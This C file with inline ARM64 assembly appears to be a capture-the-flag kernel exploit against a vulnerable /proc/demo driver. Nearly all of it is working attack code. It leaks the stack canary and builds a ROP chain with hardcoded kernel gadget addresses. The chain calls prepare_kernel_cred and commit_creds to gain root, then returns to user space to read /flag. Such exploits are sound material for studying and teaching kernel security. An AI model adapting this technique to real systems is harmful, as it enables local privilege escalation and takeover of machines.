#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

size_t user_sp_v;
size_t *user_sp = &user_sp_v;
char* tmpbuf[0x1000];

size_t canary;
size_t commit_creds = 0xffff8000080a2258;
size_t prepare_kernel_cred = 0xffff8000080a24f8;

void foo()
{
    // [0x4006b4] restore user stack
    asm("mov x11, %0" : : "r" (user_sp));
    asm("ldr x12, [x11]");
    asm("mov sp, x12");

    // orw
    int fd = open("/flag", 0);
    read(fd, tmpbuf, 0x40);
    write(1, tmpbuf, 0x40);

}

// 0xffff800008014f58: ldp x21, x22, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret
// 0xffff8000080dc468: ldr x0, [sp, #0x28]; ldp x29, x30, [sp], #0x30; ret
// 
// 0xffff800008012024 <ret_to_user+112>:   msr     elr_el1, x21

void save_status()
{
    asm("mov x11, %0" : : "r" (user_sp));
    asm("mov x12, sp");
    asm("str x12, [x11]");
}

int main()
{
    save_status();
    size_t buf[0x1000/8] = {0};

    int fd = open("/proc/demo", O_RDWR);

    // read
    read(fd, buf, 0xe0);
    canary = buf[12];

    // write
    memset(buf, 0, 0x1000);
    memset(buf, 'A', 0x90);

    buf[16] = canary;
    buf[0x90/8] = 0xffff8000080dc468;
    
    buf[0xb0/8] = prepare_kernel_cred+4;
    buf[0xd0/8] = 0;

    buf[0xe0/8] = commit_creds+4;

    buf[0x100/8] = 0xffff800008014f58;

    buf[0x130/8] = 0xffff800008012024;      // ret_to_user
    buf[0x148/8] = 0x4006b4;                // elr_el1
    
    write(fd, buf, 0x200);

    close(fd);
    return 0;
}
